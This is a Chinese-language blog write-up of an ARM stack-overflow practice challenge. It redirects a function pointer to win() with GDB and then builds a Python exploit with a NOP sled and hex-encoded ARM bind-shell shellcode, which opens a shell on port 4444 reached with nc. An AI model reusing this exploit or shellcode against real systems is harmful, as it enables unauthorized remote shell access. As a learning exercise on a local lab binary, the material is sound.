***本文原创作者：xiongchaochao，本文属于FreeBuf原创奖励计划，未经许可禁止转载**  

## 引言

**从最开始的堆栈溢出的学习到后面三个ELF二进制可进制文件的实战，每一次的调试、下断点、查看内存数据、查看汇编代码、EXP的植入，都让我对堆栈溢出这块的知识更加牢固，那么下面继续星辰大海的征途。**

第四个实例stack3的分析破解，在下面分析的过程中主要是两个方面：

1.破解文件执行流程，拿到flag：这一步主要是考验汇编能力，拓宽视野，让我知道，原来溢出还能这么来

2.shellcode覆盖（当然这一步是我自己加的），它后面有具体的例子让执行shellcode，但是我把每个例子都用shellcode利用了一遍，主要也是熟练、熟练、熟练。

这一步目前我补充了两个小点：

1.利用shellcode前一点要检查程序的保护机制，它直接影响你的shellcode是否可以执行，是否需要用别的技术绕过。

2.原来将我们的shellcode读取到栈内的截断字符不止有0x00，还有0x20，0x0a。

## stack3

### 1.查看文件结构

file
stack3：嗯，二进制可执行文件，没有剥离符号表，不过我习惯用objdump工具看汇编代码，暂时用不到符号表。不过这并不代表这一步没有用，我认为，当你拿到一个文件，你需要了解他是什么文件，它有什么有用的数据，至于要不要用是了解之后的事了。

stack3：ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically
linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 2.6.32,
BuildID[sha1]=b912b7ae33ba715dfdb11c03118b63718a7c1aaf, not stripped。

### 2.read the fack source code，读他的汇编代码

objdump -d ./stack3`gets`明显是一个溢出点，将用户的输入写到r0存储的这个地址中去，然后cmp将[fp,
#-8]地址存的值和0做一个比较，如果相等就跳转到结束的地方，这是第一个分支跳转的地方，我们需要走他的另一个分支，所以我们需要满足[fp,
#-8]地址存的值不等于0，很明显只有溢出才能更改这个栈地址的值，改了之后它会输出显示r0、r1的值，但是最后有一点不一样的地方，它会跳转到[fp,
#-8]存放的地址中去，这时候如果我们随意输入很长的字符串来随意覆盖[fp, #-8]的位置，那么会造成下面的Segmentation
fault，我们需要它正常执行，所以我们要找一个正常的地址让他跳过去，这里我们可以给[fp,
#-8]位置覆盖一个0x000104dc的值它可以正常执行，这是一个正确的思路。但是在反汇编代码中有一个函数win，它会输出一句话，这也可能是出题人让我们跳转的地址，我们可以记下这个地方，调试的时候看一下这句话的内容，来选择行的跳转这两的地方都是可以的：

    
    
    0001047c <win>:
       1047c:    e92d4800     push    {fp, lr}
       10480:    e28db004     add    fp, sp, #4
       10484:    e59f0004     ldr    r0, [pc, #4]    ; 10490 <win+0x14>
       10488:    ebffffa5     bl    10324 <puts@plt>
       1048c:    e8bd8800     pop    {fp, pc}
       10490:    00010560     .word    0x00010560
    
    00010494 <main>:
       10494:    e92d4800     push    {fp, lr}
       10498:    e28db004     add    fp, sp, #4
       1049c:    e24dd050     sub    sp, sp, #80    ; 0x50
       104a0:    e50b0050     str    r0, [fp, #-80]    ; 0xffffffb0
       104a4:    e50b1054     str    r1, [fp, #-84]    ; 0xffffffac
       104a8:    e3a03000     mov    r3, #0
       104ac:    e50b3008     str    r3, [fp, #-8]
       104b0:    e24b3048     sub    r3, fp, #72    ; 0x48
       104b4:    e1a00003     mov    r0, r3
       104b8:    ebffff96     bl    10318 <gets@plt>
       104bc:    e51b3008     ldr    r3, [fp, #-8]
       104c0:    e3530000     cmp    r3, #0
       104c4:    0a000004     beq    104dc <main+0x48>
       104c8:    e59f0018     ldr    r0, [pc, #24]    ; 104e8 <main+0x54>
       104cc:    e51b1008     ldr    r1, [fp, #-8]
       104d0:    ebffff8d     bl    1030c <printf@plt>
       104d4:    e51b3008     ldr    r3, [fp, #-8]
       104d8:    e12fff33     blx    r3
       104dc:    e1a00003     mov    r0, r3
       104e0:    e24bd004     sub    sp, fp, #4
       104e4:    e8bd8800     pop    {fp, pc}
       104e8:    00010580     .word    0x00010580
    

随便输出长字符而造成的结果：

    
    
    pi@raspberrypi:~/Desktop/ARM-challenges $ ./stack3
    1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
    calling function pointer, jumping to 0x31313131
    Segmentation fault
    

### GDB调试

根据上面的分析，从FP-#72到FP-#8，需要填充64个字节的填充字符，再加4个字节的覆盖字符，总共68字节，我们在104bc地址下断点b
*0x104bc，然后写入68字节字符，看[fp, #-8]栈地址的数据(x/2wx $fp-8)是否被覆盖。从结果来说，成功覆盖：

    
    
    gef> x/2wx $fp-8
    0xbeffefe4:    0x31313131    0x00000000
    gef> x/s $fp-8
    0xbeffefe4:    "1111"
    

第一步完成，我们跳转到特定分支上后，紧跟着我们在第一步的基础上，先查看win函数的输出内容，x/s
0x00010560，很明显这是出题人需要我们跳转的地址，我们用0x00010560来替换最后的四字节数据：

    
    
    gef> x/s 0x00010560
    0x10560:    "code flow successfully changed"
    

最终使用下面的命令：

    
    
    printf '1111111111111111111111111111111111111111111111111111111111111111\x7c\x04\x01\x00' | ./stack3

来完成最后的输出：

    
    
    pi@raspberrypi:~/Desktop/ARM-challenges $ printf '1111111111111111111111111111111111111111111111111111111111111111\x7c\x04\x01\x00' | ./stack3calling function pointer, jumping to 0x0001047ccode flow successfully changed

### 3.shellcode

利用gef插件检查程序的保护机制，没有保护，直接把shellcode写到栈内执行：

    
    
    gef> checksec 
    [+] checksec for '/home/pi/Desktop/ARM-challenges/stack3'
    Canary                        : No
    NX                            : No
    PIE                           : No
    Fortify                       : No
    RelRO                         : No
    

在main函数结束的位置下断点：0x000104e4，将之前的长字符写入文件exp然后，r<exp，运行过第一个分支判断，到结束的位置，观察栈空间数据，找到存储返回地址的栈地址，获取其下面的地址，如下，可以看到0xbeffeff0这个地址就是我们要跳转的地址：

    
    
    0x000104e4 <+80>:    pop    {r11, pc}
    
    
    
    ---------------------------------------------------------------------------------------------- stack ----    0xbeffefe8|+0x0000: 0xbeffeff0 -> 0x90909090    <-$sp
    0xbeffefec|+0x0004: 0xbeffeff0 -> 0x90909090    <-$r11
    0xbeffeff0|+0x0008: 0x90909090
    

构造python文件生成相应的exp：

    
    
    import struct
    padding = "1111111111111111111111111111111111111111111111111111111111111111"
    win_addr = struct.pack("I", 0x0001047c)
    
    payload1 = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x01\x21\x48\x1c\x92\x1a\xc8\x27\x51\x37\x01\xdf\x04\x1c\x14\xa1\x4a\x70\x8a\x80\xc0\x46\x8a\x71\xca\x71\x10\x22\x01\x37\x01\xdf\x60\x1c\x01\x38\x02\x21\x02\x37\x01\xdf\x60\x1c\x01\x38\x49\x40\x52\x40\x01\x37\x01\xdf\x04\x1c\x60\x1c\x01\x38\x49\x1a\x3f\x27\x01\xdf\xc0\x46\x60\x1c\x01\x38\x01\x21\x01\xdf\x60\x1c\x01\x38\x02\x21\x01\xdf\x04\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x02\xff\x11\x5c\x01\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x58"
    
    print padding + win_addr + "\xf0\xef\xff\xbe"*2 + "\x90"*100 + payload1
    

执行结果：

服务端开始等待监听：

    
    
    pi@raspberrypi:~/Desktop/ARM-challenges $ ./stack3 <exp
    calling function pointer, jumping to 0x0001047c
    code flow successfully changed
    

客户端发起连接：

    
    
    pi@raspberrypi:~/Desktop/ARM-challenges $ nc -vv 127.0.0.1 4444
    Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
    whoami
    pi
    

# 附录：

> [1][ARM汇编之内存损坏：堆栈溢出](https://www.freebuf.com/vuls/192709.html)
>
> [2][ARM汇编之堆栈溢出实战分析（GDB）](https://www.anquanke.com/post/id/169071)
>
>
> [3][详解大端模式和小端模式](https://blog.csdn.net/ce123_zhouwei/article/details/6971544)

 ***本文原创作者：xiongchaochao，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

